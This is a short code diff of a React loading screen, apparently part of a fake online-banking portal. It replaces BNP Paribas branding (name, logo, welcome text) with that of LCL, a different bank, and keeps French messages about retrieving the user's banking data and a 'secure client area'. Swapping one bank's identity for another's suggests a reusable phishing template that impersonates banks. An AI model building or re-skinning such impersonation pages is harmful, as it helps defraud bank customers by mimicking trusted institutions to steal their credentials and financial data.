@@ -6,7 +6,7 @@ const STEPS = [
   { min: 40, label: "Chargement de votre espace client..." },
   { min: 60, label: "Récupération de vos données bancaires..." },
   { min: 80, label: "Finalisation de l'accès sécurisé..." },
-  { min: 95, label: "Bienvenue dans votre espace BNP Paribas" },
+  { min: 95, label: "Bienvenue dans votre espace LCL" },
 ];
 
 export default function LoadingPage({ progress = 0 }: { progress?: number }) {
@@ -35,11 +35,11 @@ export default function LoadingPage({ progress = 0 }: { progress?: number }) {
           className="mb-10 w-28 h-28 rounded-3xl overflow-hidden shadow-2xl"
           style={{ border: "2px solid rgba(255,255,255,0.2)", boxShadow: "0 20px 60px rgba(0,0,0,0.4)" }}
         >
-          <img src="/assets/logo.png" alt="BNP Paribas" className="w-full h-full object-cover" />
+          <img src="/assets/lcl-logo.svg" alt="LCL" className="w-full h-full object-cover" />
         </motion.div>
 
         {/* Title */}
-        <h1 className="text-white font-black text-3xl tracking-tight mb-1">BNP Paribas</h1>
+        <h1 className="text-white font-black text-3xl tracking-tight mb-1">LCL</h1>
         <p className="text-green-300 text-sm font-medium mb-12 tracking-wide">Espace Client Sécurisé</p>
 
         {/* Progress bar */}
